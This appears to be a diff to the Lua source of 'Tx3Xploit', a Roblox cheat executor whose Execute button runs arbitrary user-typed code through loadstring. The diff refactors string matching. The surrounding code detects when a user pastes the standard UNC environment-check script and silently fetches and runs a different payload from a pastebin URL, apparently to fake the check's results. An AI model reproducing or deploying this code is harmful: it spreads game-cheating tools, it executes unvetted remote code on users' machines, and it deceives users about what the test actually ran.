@@ -1,3 +1,7 @@
+local function uncfind(text, searchunc)
+    return string.find(text, searchunc, 1, true) ~= nil
+end
+
 print("Tx3Xploit is ready")
 print("Enjoy Tx3Xploit ;)")
 local Tx3Xploit = Instance.new("ScreenGui")
@@ -195,20 +199,20 @@ execute.TextSize = 14.000
 execute.TextWrapped = true
 execute.MouseButton1Down:connect(function()
     local unc = "https://raw.githubusercontent.com/unified-naming-convention/NamingStandard/main/UNCCheckEnv.lua"
-    if exedbox.Visible == true then
-        if exedbox.Text:find(unc) then
+    if exedbox.Visible then
+        if uncfind(exedbox.Text, unc) then
             loadstring(game:HttpGet("https://pastebin.com/raw/qGXRcXpP"))()
         else
             loadstring(exedbox.Text)()
         end
-    elseif exedboxtab2.Visible == true then
-        if exedboxtab2.Text:find(unc) then
+    elseif exedboxtab2.Visible then
+        if uncfind(exedboxtab2.Text, unc) then
             loadstring(game:HttpGet("https://pastebin.com/raw/qGXRcXpP"))()
         else
             loadstring(exedboxtab2.Text)()
         end
     else
-        if exedboxtab3.Text:find(unc) then
+        if uncfind(exedboxtab3.Text, unc) then
             loadstring(game:HttpGet("https://pastebin.com/raw/qGXRcXpP"))()
         else
             loadstring(exedboxtab3.Text)()
